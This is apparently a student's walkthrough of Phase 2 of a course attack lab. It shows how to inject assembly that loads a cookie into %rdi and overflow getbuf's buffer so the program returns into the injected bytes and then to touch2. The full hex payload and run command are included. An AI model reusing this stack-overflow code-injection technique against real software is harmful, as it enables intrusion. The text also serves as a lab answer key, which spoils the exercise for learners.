### **Phase 2**

Phase 2 wants us to try and call **touch2** and make it look like you passed your cookie as an argument. 

To find your cookie, run ctarget

```
./ctarget
```

My cookie is: ```$0x33f72ca5```

Go through ctarget's objdump and find the addresses of **getbuf** and **touch2**.

Getbuf's Address: ```0x5553a860```

Touch2's Address: ```0x401d4e ```

The difficult part of this phase is having to modify the %rdi register and putting our cookie there. 

In order to complete this task, we have to write assembly code, create a file called **ctarget_l2_inject.s** and write the following to move your cookie into %rdi

```
movq $0x33f72ca5, %rdi
```
The above code is in assembly, but we need the byte representation of this. To do so run the following

``` 
as ctarget_l2_inject.s -o ctarget_l2_inject.o
```

To see the disassembled code, run
```
objdump -d ctarget_l2_inject.o
```

It should look something like this

```
ctarget_l2_inject.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 a5 2c f7 33    mov    $0x33f72ca5,%rdi
```


Now with all the pieces to this puzzle, we can begin to create our attack.

1. Create a file called **ctarget.lv2**
2. Add the **ctarget_l2_inject.o** objdump output
3. Add a **c3** which represents **retq** in assembly
4. Fill the rest of your buffer with padding
5. Add the return address of **getbuf** in little-endian with padding
6. Add the return address of **touch2** in litte-endian with padding

It should look something like this

```
/* Objdump of the movq */
48 c7 c7 a5 2c f7 33 c3
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00

/* Ret address of getbuf */
/* 0x5553a860 */
60 a8 53 55 00 00 00 00

/* Ret address of touch2 */
/* 0x401d4e */
4e 1d 40 00 00 00 00 00
```

To run it, type

```
./hex2raw < ctarget.lv2 | ./ctarget
```

Phase 2 is complete, on to the next